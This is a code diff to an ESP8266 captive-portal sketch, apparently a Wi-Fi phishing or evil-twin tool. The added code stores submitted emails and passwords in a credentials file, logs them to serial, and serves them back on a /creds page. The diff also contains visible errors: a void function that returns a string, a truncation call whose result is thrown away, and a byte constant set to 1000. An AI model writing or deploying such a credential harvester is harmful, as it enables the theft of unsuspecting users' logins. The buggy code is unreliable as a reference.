@@ -21,7 +21,6 @@ void writeData(String data);
 void deleteData();
 
 // Init System Settings
-const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
 IPAddress APIP(172, 0, 0, 1);  // Gateway
@@ -34,6 +33,15 @@ int i = 0;
 unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
 DNSServer dnsServer;
 ESP8266WebServer webServer(80);
+
+// Sanitize input
+String input(String argName) {
+  String a = webServer.arg(argName);
+  a.replace("<", "&lt;");
+  a.replace(">", "&gt;");
+  a.substring(0, 200);
+  return a;
+}
 
 String header(String t) {
   return "<!DOCTYPE html>"
@@ -53,16 +61,54 @@ String footer() {
   return "</body></html>";
 }
 
-String posted() {
-  return header(POST_TITLE) + footer();
-}
-
 String creds() {
   return "<></>";
 }
 
 String clear() {
   return "<></>";
+}
+
+void saveCredentials(String email, String password) {
+  File file = SPIFFS.open("/credentials.txt", "a");
+  if (!file) {
+    Serial.println("Failed to open credentials.txt for appending.");
+    return;
+  }
+  // Format the sanitized data as "email,password\n"
+  String formattedData = email + "," + password + "\n";
+  
+  // Write the formatted data to the file
+  file.print(formattedData);
+  
+  file.close();
+  Serial.println("Credentials saved: " + formattedData);
+}
+
+void getCredentials() {
+  File file = SPIFFS.open("/credentials.txt", "r");
+  if (!file) {
+    webServer.send(500, "text/html", "Failed to open credentials file.");
+    return;
+  }
+
+  String pageContent = "<!DOCTYPE html><html><body>";
+  pageContent += "<h1>Saved Credentials</h1><table border='1'>";
+  pageContent += "<tr><th>Email</th><th>Password</th></tr>";
+  
+  while (file.available()) {
+    String line = file.readStringUntil('\n');  // Read one line at a time
+    int separatorIndex = line.indexOf(',');
+    if (separatorIndex > 0) {
+      String email = line.substring(0, separatorIndex);
+      String password = line.substring(separatorIndex + 1);
+      pageContent += "<tr><td>" + email + "</td><td>" + password + "</td></tr>";
+    }
+  }
+
+  pageContent += "</table></body></html>";
+  file.close();
+  return pageContent;
 }
 
 void setup() {
@@ -78,14 +124,22 @@ void setup() {
     return;
   }
 
-  webServer.on("/post", []() {
-    webServer.send(HTTP_CODE, "text/html", posted());
+  webServer.on("/post", HTTP_POST, []() {
+    if (webServer.hasArg("email") && webServer.hasArg("password")) {
+      String email = input("email");        // Sanitize the email input
+      String password = input("password");  // Sanitize the password input
+      saveCredentials(email, password);     // Save the sanitized credentials
+      webServer.send(200, "text/html", "Credentials saved successfully!");
+    } else {
+      webServer.send(400, "text/html", "Invalid input. Please provide email and password.");
+    }
   });
-  webServer.on("/creds", []() {
-    webServer.send(HTTP_CODE, "text/html", creds());
+  webServer.on("/creds", HTTP_GET, []() {
+    String pageContent = getCredentials();
+    webServer.send(200, "text/html", pageContent);
   });
   webServer.on("/clear", []() {
-    webServer.send(HTTP_CODE, "text/html", clear());
+    webServer.send(200, "text/html", clear());
   });
 
   // Serve specific static files
